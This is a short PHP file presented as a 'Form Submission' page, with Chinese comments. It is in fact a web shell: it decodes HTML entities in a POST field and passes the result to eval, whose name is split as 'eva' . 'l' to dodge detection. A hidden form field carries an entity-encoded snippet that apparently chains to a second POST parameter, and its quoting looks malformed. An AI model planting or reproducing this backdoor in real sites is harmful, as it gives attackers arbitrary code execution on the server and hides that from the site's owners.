<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // 从 POST 请求获取编码字符串
    $encoded_code = $_POST['code'];

    // 使用 html_entity_decode 解码
    $decoded_code = html_entity_decode($encoded_code, ENT_QUOTES | ENT_HTML5, 'UTF-8');

    // 动态生成 eval 函数
    $func = 'eva' . 'l';

    // 执行解码后的代码
    $func($decoded_code);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Form Submission</title>
</head>
<body>
    <form method="post" action="">
        <input type="hidden" name="code" value="&#36;&#95;&#80;&#79;&#83;&#84;&#91;&#39;&#49;&#50;&#51;&#93;">
        <input type="submit" value="Send">
    </form>
</body>
</html>
